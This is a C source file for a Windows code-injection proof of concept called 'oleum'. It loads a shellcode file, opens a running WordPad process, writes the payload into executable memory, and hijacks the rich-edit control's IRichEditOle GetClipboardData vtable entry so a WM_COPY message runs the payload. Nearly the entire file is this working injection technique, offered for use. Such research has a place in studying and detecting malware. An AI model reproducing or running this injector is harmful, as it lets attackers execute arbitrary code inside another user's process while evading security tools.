/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE
#include <Windows.h>
#include <richedit.h>
#include <richole.h>

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

typedef struct _IRichEditOle_t {
    ULONG_PTR QueryInterface;
    ULONG_PTR AddRef;
    ULONG_PTR Release;
    ULONG_PTR GetClientSite;
    ULONG_PTR GetObjectCount;
    ULONG_PTR GetLinkCount;
    ULONG_PTR GetObject;
    ULONG_PTR InsertObject;
    ULONG_PTR ConvertObject;
    ULONG_PTR ActivateAs;
    ULONG_PTR SetHostNames;
    ULONG_PTR SetLinkAvailable;
    ULONG_PTR SetDvaspect;
    ULONG_PTR HandsOffStorage;
    ULONG_PTR SaveCompleted;
    ULONG_PTR InPlaceDeactivate;
    ULONG_PTR ContextSensitiveHelp;
    ULONG_PTR GetClipboardData;
    ULONG_PTR ImportDataObject;
} _IRichEditOle;
    
DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len,rd=0;

    // 1. open the file
    hf=CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if(hf!=INVALID_HANDLE_VALUE){
      // get file size
      len=GetFileSize(hf, 0);
      // allocate memory
      *pic=malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}
            
// doesn't require elevated privileges for processes in the same session            
VOID oleum(LPVOID payload, DWORD payloadSize) {
    HANDLE                hp;
    DWORD                 id;
    HWND                  wpw, rew;
    LPVOID                cs, ds, ptr, mem, tbl;
    SIZE_T                rd, wr;
    _IRichEditOle         reo;
    
    // 1. Get the window handle
    wpw = FindWindow(L"WordPadClass", NULL);
    rew = FindWindowEx(wpw, NULL, L"RICHEDIT50W", NULL);
    
    // 2. Obtain the process id and try to open process
    GetWindowThreadProcessId(rew, &id);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);

    // 3. Allocate RWX memory and copy the payload there
    cs = VirtualAllocEx(hp, NULL, payloadSize, 
      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
      
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    
    // 4. Allocate RW memory for the current address
    ptr = VirtualAllocEx(hp, NULL, sizeof(ULONG_PTR),
      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
      
    // 5. Query the interface
    SendMessage(rew, EM_GETOLEINTERFACE, 0, (LPARAM)ptr);
    
    // 6. Read the memory address
    ReadProcessMemory(hp, ptr, &mem, sizeof(ULONG_PTR), &wr);

    // 7. Read IRichEditOle.lpVtbl
    ReadProcessMemory(hp, mem, &tbl, sizeof(ULONG_PTR), &wr);

    // 8. Read virtual function table
    ReadProcessMemory(hp, tbl, &reo, sizeof(_IRichEditOle), &wr);

    // 9. Allocate memory for copy of virtual table
    ds = VirtualAllocEx(hp, NULL, sizeof(_IRichEditOle),
      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
      
    // 10. Set the GetClipboardData method to address of payload
    reo.GetClipboardData = (ULONG_PTR)cs;
    
    // 11. Write new virtual function table to remote memory
    WriteProcessMemory(hp, ds, &reo, sizeof(_IRichEditOle), &wr);
    
    // 12. update IRichEditOle.lpVtbl
    WriteProcessMemory(hp, mem, &ds, sizeof(ULONG_PTR), &wr); 
    
    // 13. Select all in the edit control
    SendMessage(rew, EM_SETSEL, 0, -1);
    
    // 14. Trigger payload by invoking the GetClipboardData method
    PostMessage(rew, WM_COPY, 0, 0);
    
    // 15. Restore original value of IRichEditOle.lpVtbl
    WriteProcessMemory(hp, mem, &tbl, sizeof(ULONG_PTR), &wr);
    
    // 16. Free memory and close process handle
    VirtualFreeEx(hp, ptr,0,  MEM_RELEASE);
    VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
    VirtualFreeEx(hp, ds, 0,  MEM_RELEASE);
    
    CloseHandle(hp);   
}

int main(void){
    LPVOID pic;
    DWORD  len;
    int    argc;
    PWCHAR *argv;
    
    argv=CommandLineToArgvW(GetCommandLine(), &argc);

    if(argc!=2){printf("usage: oleum <payload>\n");return 0;}

    len=readpic(argv[1], &pic);
    if (len==0) { printf("invalid payload\n"); return 0;}

    oleum(pic, len);
    return 0;
}
